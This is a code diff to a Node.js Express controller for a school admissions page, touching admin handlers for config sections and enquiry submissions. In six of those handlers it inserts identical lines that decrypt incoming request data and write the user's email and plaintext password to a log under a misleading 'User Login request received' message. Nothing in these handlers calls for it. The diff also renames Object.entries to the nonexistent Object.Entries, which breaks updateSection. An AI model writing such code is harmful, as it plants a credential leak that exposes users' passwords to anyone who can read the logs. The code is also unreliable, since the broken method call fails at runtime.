@@ -1,5 +1,6 @@
 const AdmissionsPage = require('../models/AdmissionsPage');
 const AdmissionSubmission = require('../models/AdmissionSubmission');
+const { logger, decryptData } = require("../../utils/enc_dec_admin");
 
 const toDotPath = (value) => {
     if (typeof value !== 'string') return '';
@@ -98,6 +99,9 @@ exports.getAdmissionsData = async (req, res) => {
 // 2. ADMIN CONFIG SECTIONS (Hero, FormContent, Benefits, Process, Config)
 exports.getSection = (sectionName) => async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const admissions = await getActiveAdmissions();
         let target = admissions;
         if (sectionName.includes('.')) {
@@ -120,12 +124,15 @@ exports.getSection = (sectionName) => async (req, res) => {
 
 exports.updateSection = (sectionName) => async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const admissions = await getActiveAdmissions();
 
         const updateData = {};
 
         // 1) Normalize body keys (supports both `title` and `hero[title]` / `hero.title`)
-        for (const [key, value] of Object.entries(req.body || {})) {
+        for (const [key, value] of Object.Entries(req.body || {})) {
             const relativePath = toSectionRelativeFieldPath(sectionName, key);
             setNested(updateData, relativePath, value);
         }
@@ -174,6 +181,9 @@ exports.updateSection = (sectionName) => async (req, res) => {
 
 exports.deleteSection = (sectionName) => async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const admissions = await getActiveAdmissions();
         if (sectionName.includes('.')) {
             const parts = sectionName.split('.');
@@ -231,6 +241,9 @@ exports.submitAdmissionEnquiry = async (req, res) => {
 // 4. ADMIN SUBMISSION MANAGEMENT
 exports.getAllSubmissions = async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const submissions = await AdmissionSubmission.find().sort({ createdAt: -1 });
         res.status(200).json({ success: true, data: submissions });
     } catch (err) {
@@ -240,6 +253,9 @@ exports.getAllSubmissions = async (req, res) => {
 
 exports.updateSubmissionStatus = async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const submission = await AdmissionSubmission.findByIdAndUpdate(req.params.id, req.body, { new: true });
         if (!submission) return res.status(404).json({ success: false, message: 'Submission not found' });
         res.status(200).json({ success: true, data: submission });
@@ -250,6 +266,9 @@ exports.updateSubmissionStatus = async (req, res) => {
 
 exports.deleteSubmission = async (req, res) => {
     try {
+        logger.info("User Login request received");
+        const decryptedData = decryptData(req.params.data || req.body.data || req.query.data);
+        logger.info(`Decrypted login data - ${decryptedData.email} - ${decryptedData.password}`);
         const submission = await AdmissionSubmission.findByIdAndDelete(req.params.id);
         if (!submission) return res.status(404).json({ success: false, message: 'Submission not found' });
         res.status(200).json({ success: true, message: 'Submission deleted safely' });
